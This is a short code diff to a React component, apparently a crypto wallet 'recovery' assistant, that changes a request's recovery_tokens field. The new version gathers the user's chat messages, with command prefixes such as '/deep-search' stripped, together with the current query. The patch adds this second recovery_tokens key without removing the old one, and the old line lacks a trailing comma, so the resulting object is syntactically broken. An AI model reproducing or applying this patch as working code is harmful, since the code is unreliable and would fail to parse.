@@ -103,6 +103,11 @@ export function RecoveryAIAssistant() {
                     richlist: foundAddresses.length > 0 ? foundAddresses.join(',') : undefined,
                     deep_scan: true,
                     recovery_tokens: sessionTokens
+                    recovery_tokens: messages
+                        .filter(m => m.type === 'user')
+                        .map(m => m.text.replace(/^\/(deep-search|start scan|start mixhunter)\s*/i, '').trim())
+                        .concat([query])
+                        .filter(t => t.length > 0)
                 }),
             });
             setIsScannerRunning(true);
